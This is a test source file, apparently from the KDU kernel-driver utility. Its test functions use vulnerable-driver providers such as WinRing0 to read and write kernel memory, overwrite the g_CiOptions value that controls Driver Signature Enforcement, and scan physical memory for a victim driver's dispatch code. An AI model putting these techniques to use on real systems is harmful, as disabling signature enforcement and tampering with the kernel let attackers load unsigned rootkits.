/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2023
*
*  TITLE:       TESTS.CPP
*
*  VERSION:     1.30
*
*  DATE:        20 Mar 2023
*
*  KDU tests.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

VOID KDUTestLoad()
{
    ULONG i;
    HINSTANCE hProv;
    PKDU_DB provLoadData;
    ULONG dataSize = 0;
    PVOID pvData;

    hProv = KDUProviderLoadDB();
    if (hProv == NULL)
        return;

    provLoadData = KDUReferenceLoadDB();
    if (provLoadData == NULL)
        return;

    for (i = 0; i < provLoadData->NumberOfEntries; i++) {

        pvData = KDULoadResource(provLoadData->Entries[i].ResourceId,
            hProv,
            &dataSize,
            PROVIDER_RES_KEY,
            TRUE);

        if (pvData) {
            printf_s("[+] Provider[%lu] loaded\r\n", provLoadData->Entries[i].ResourceId);
            supHeapFree(pvData);
        }
        else {
            printf_s("[+] Provider[%lu] failed to load\r\n", provLoadData->Entries[i].ResourceId);
        }


    }
}

VOID KDUTestDSE(PKDU_CONTEXT Context)
{
    ULONG_PTR g_CiOptions = 0xfffff8065963a438;//need update
    ULONG_PTR oldValue = 0, newValue = 0x6, testValue = 0;
    KDU_PROVIDER* prov = Context->Provider;

    if (prov->Callbacks.ReadKernelVM) {
        prov->Callbacks.ReadKernelVM(Context->DeviceHandle, g_CiOptions, &oldValue, sizeof(oldValue));
        Beep(0, 0);
    } 

    if (prov->Callbacks.WriteKernelVM) {
        prov->Callbacks.WriteKernelVM(Context->DeviceHandle, g_CiOptions, &newValue, sizeof(newValue));
        Beep(0, 0);
    }
    
    if (prov->Callbacks.ReadKernelVM) {
        prov->Callbacks.ReadKernelVM(Context->DeviceHandle, g_CiOptions, &testValue, sizeof(testValue));

        if (testValue != newValue)
            Beep(1, 1);
    }

    if (prov->Callbacks.WriteKernelVM) {
        prov->Callbacks.WriteKernelVM(Context->DeviceHandle, g_CiOptions, &oldValue, sizeof(oldValue));
    }
}

BOOL WINAPI TestPhysMemEnumCallback(
    _In_ ULONG_PTR Address,
    _In_ PVOID UserContext)
{
   
    PKDU_PHYSMEM_ENUM_PARAMS Params = (PKDU_PHYSMEM_ENUM_PARAMS)UserContext;
   
    ULONG signatureSize = Params->DispatchSignatureLength;

    BYTE buffer[PAGE_SIZE];
    RtlSecureZeroMemory(&buffer, sizeof(buffer));

    if (Params->ReadPhysicalMemory(Params->DeviceHandle,
        Address,
        &buffer,
        PAGE_SIZE))
    {
        if (signatureSize == RtlCompareMemory(Params->DispatchSignature,
            RtlOffsetToPointer(buffer, Params->DispatchHandlerPageOffset),
            signatureSize))
        {
            printf_s("\t Found code at address 0x%llX\r\n", Address);
            Params->ccPagesFound += 1;
        }
    }

    return FALSE;
}

VOID TestBrute(PKDU_CONTEXT Context)
{
    KDU_PHYSMEM_ENUM_PARAMS params;
    VICTIM_IMAGE_INFORMATION vi;
    HANDLE victimDeviceHandle = NULL;

    if (VpCreate(Context->Victim, Context->ModuleBase, &victimDeviceHandle, NULL, NULL)) {

        RtlSecureZeroMemory(&vi, sizeof(vi));
        VpQueryInformation(Context->Victim, VictimImageInformation, &vi, sizeof(vi));

        params.DeviceHandle = Context->DeviceHandle;
        params.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
        params.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;

        params.DispatchSignature = Context->Victim->Data.DispatchSignature;
        params.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;

        params.DispatchHandlerOffset = vi.DispatchOffset;
        params.DispatchHandlerPageOffset = vi.DispatchPageOffset;
        params.JmpAddress = vi.JumpValue;

        params.bWrite = FALSE;
        params.cbPayload = 0;
        params.pvPayload = NULL;
        params.ccPagesFound = 0;
        params.ccPagesModified = 0;

        if (supEnumeratePhysicalMemory(TestPhysMemEnumCallback, &params)) {

            printf_s("[+] Number of pages found: %llu\r\n", params.ccPagesFound);

        }
    }
}

VOID KDUTest()
{
    PKDU_CONTEXT Context;
    ULONG_PTR objectAddress = 0, value;

    UCHAR Buffer[4096];

    RtlSecureZeroMemory(&Buffer, sizeof(Buffer));

    Context = KDUProviderCreate(KDU_PROVIDER_WINRING0, 
        FALSE, 
        NT_WIN7_SP1, 
        KDU_SHELLCODE_V1, 
        ActionTypeMapDriver);

    if (Context) {
 
        /*Context->Provider->Callbacks.ReadPhysicalMemory(Context->DeviceHandle,
            0x0000000072a3a000,
            Buffer,
            sizeof(Buffer));*/

        TestBrute(Context);
        KDUTestDSE(Context);

        //ULONG64 dummy = 0;

        /*Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
            0xfffff80afbbe6d18,
            &dummy,
            sizeof(dummy));*/

        if (supQueryObjectFromHandle(Context->DeviceHandle, &objectAddress)) {

            /*   Context->Provider->Callbacks.ReadPhysicalMemory(
                   Context->DeviceHandle,
                   0x1000,
                   &Buffer,
                   0x1000);
                   */
            value = 0x1234567890ABCDEF;

            //objectAddress = 0xfffff80710636d18;

            FILE_OBJECT fileObject;

            RtlSecureZeroMemory(&fileObject, sizeof(FILE_OBJECT));

            if (Context->Provider->Callbacks.ReadKernelVM) {
                Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                    objectAddress,
                    &fileObject,
                    sizeof(FILE_OBJECT));

                Beep(0, 0);
            }

        }

        KDUProviderRelease(Context);
    }
}
